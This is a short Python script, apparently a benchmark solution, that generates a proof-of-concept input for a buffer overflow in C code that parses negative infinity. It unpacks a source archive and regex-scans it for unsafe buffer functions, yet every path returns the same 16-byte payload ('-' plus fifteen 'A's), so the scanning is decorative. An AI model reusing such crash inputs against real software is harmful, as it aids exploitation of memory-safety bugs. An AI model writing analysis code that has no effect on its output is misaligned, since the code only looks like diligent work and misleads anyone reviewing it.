import os
import tarfile
import tempfile
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code to analyze it
        with tarfile.open(src_path, 'r:gz') as tar:
            temp_dir = tempfile.mkdtemp()
            tar.extractall(temp_dir)
        
        # Look for relevant C/C++ source files
        source_files = []
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                if file.endswith(('.c', '.cc', '.cpp', '.cxx')):
                    source_files.append(os.path.join(root, file))
        
        # Analyze files for infinity parsing patterns
        pattern = re.compile(r'-\s*inf', re.IGNORECASE)
        for file_path in source_files:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if pattern.search(content):
                    # Found potential infinity parsing code
                    # Look for buffer operations in the same file
                    buffer_patterns = [
                        r'strcpy\s*\([^,]+,\s*[^)]+\)',
                        r'strncpy\s*\([^,]+,\s*[^,]+,\s*[^)]+\)',
                        r'sprintf\s*\([^,]+,\s*[^)]+\)',
                        r'scanf\s*\([^,]+,\s*[^)]+\)',
                        r'gets\s*\([^)]+\)',
                        r'fgets\s*\([^,]+,\s*\d+,\s*[^)]+\)',
                        r'memcpy\s*\([^,]+,\s*[^,]+,\s*[^)]+\)'
                    ]
                    
                    for buf_pat in buffer_patterns:
                        if re.search(buf_pat, content):
                            # Construct PoC based on vulnerability description
                            # The PoC needs to start with minus sign but not be "inf"
                            # and cause buffer overflow
                            poc = b"-" + b"A" * 15  # 16 bytes total
                            
                            # Clean up
                            import shutil
                            shutil.rmtree(temp_dir)
                            return poc
        
        # Fallback PoC if analysis fails
        import shutil
        shutil.rmtree(temp_dir)
        return b"-" + b"A" * 15  # 16 bytes total
